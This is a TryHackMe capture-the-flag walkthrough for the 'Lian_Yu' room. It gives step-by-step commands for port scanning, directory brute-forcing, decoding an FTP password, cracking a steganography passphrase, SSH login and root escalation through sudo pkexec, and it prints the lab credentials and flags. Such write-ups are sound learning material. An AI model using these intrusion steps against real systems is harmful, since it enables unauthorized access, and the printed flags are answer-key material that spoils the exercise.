A TryHackMe beginner CTF walkthrough covering enumeration, web discovery, FTP access, steganography, SSH access, and privilege escalation.

Platform: TryHackMe Difficulty: Easy Theme: Arrowverse Target: Linux
Spoiler warning: this writeup contains commands, credentials, filenames, and flags for the Lian_Yu room. Use it only for authorized lab practice and learning.

Enumeration

Identify exposed services, discover web directories, and inspect page source for hidden hints.

Credential Discovery

Decode a Base58 ticket, log in to FTP, and extract hidden data from downloaded files.

Privilege Escalation

Use sudo permissions for pkexec to spawn a root shell.

Walkthrough

Initial scan

Start with service enumeration. The important open ports are FTP, SSH, HTTP, and RPC. 

nmap -sC -sV -p- <target-ip>

Expected services:

21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1
80/tcp  open  http    Apache httpd
111/tcp open  rpcbind

Web enumeration

Browse the HTTP service, then brute-force directories. The first useful path is /island. 

gobuster dir -u http://<target-ip> \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Viewing the page or source reveals the code word vigilante, which later works as the FTP username. A second directory scan under /island reveals /2100. 

gobuster dir -u http://<target-ip>/island \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Find the ticket

The /island/2100 page hints at a ticket. Scan for files with the .ticket extension. 

gobuster dir -u http://<target-ip>/island/2100 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x ticket

This reveals green_arrow.ticket. Its content is Base58 encoded and decodes to the FTP password. 

echo '<base58-ticket-value>' | base58 -d

Decoded password: !#th3h00d

FTP access

Use the discovered username and password to log in to FTP. Download the available files and check whether you can move up to see other user directories. 

ftp <target-ip>
Name: vigilante
Password: !#th3h00d

ftp> ls -la
ftp> mget *
ftp> cd ..
ftp> ls -la
ftp> get .other_user

The FTP area provides images for steganography and points to another user: slade.

Steganography and SSH password

Inspect the downloaded images. The useful one is aa.jpg. Extract the embedded content with steghide or crack the stego passphrase with stegseek. 

stegseek aa.jpg /usr/share/wordlists/rockyou.txt
steghide extract -sf aa.jpg

The extracted archive leads to files named passwd.txt and shado. Read shado to recover the SSH password: M3tahuman.

SSH and user flag

Combine the username discovered from FTP with the SSH password from the stego extraction. 

ssh slade@<target-ip>
Password: M3tahuman

slade@LianYu:~$ ls
slade@LianYu:~$ cat user.txt

User flag: THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}

Privilege escalation

Check sudo privileges. The user can run pkexec as root, which can be used to spawn a privileged shell. 

sudo -l
sudo /usr/bin/pkexec /bin/sh

# id
# cat /root/root.txt

Root flag: THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
